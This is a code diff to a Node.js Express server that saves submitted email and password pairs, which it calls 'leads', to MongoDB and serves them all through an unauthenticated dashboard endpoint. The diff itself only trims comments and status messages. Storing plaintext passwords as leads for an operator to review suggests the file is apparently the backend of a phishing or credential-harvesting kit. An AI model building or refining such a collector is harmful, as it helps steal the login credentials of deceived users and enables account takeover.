@@ -8,12 +8,11 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static('public'));
 
-// Connect to your MongoDB
+// Connect to MongoDB
 mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log("Connected to MongoDB successfully"))
-  .catch(err => console.error("Could not connect to MongoDB...", err));
+  .then(() => console.log("Connected to MongoDB"))
+  .catch(err => console.error("Mongo connection error:", err));
 
-// Define what the data looks like
 const leadSchema = new mongoose.Schema({
     email: String,
     password: String,
@@ -24,24 +23,22 @@ const leadSchema = new mongoose.Schema({
 
 const Lead = mongoose.model('Lead', leadSchema);
 
-// This is what the frontend calls to save the info
 app.post('/update', async (req, res) => {
     try {
         const lead = new Lead(req.body);
         await lead.save();
-        res.status(200).send("Data saved permanently.");
+        res.status(200).send("Saved.");
     } catch (err) {
-        res.status(500).send("Error saving data.");
+        res.status(500).send("Error.");
     }
 });
 
-// This is what your dashboard calls to show the info
 app.get('/dashboard', async (req, res) => {
     try {
         const leads = await Lead.find().sort({ timestamp: -1 });
         res.json(leads);
     } catch (err) {
-        res.status(500).send("Error fetching data.");
+        res.status(500).send("Error fetching leads.");
     }
 });
 
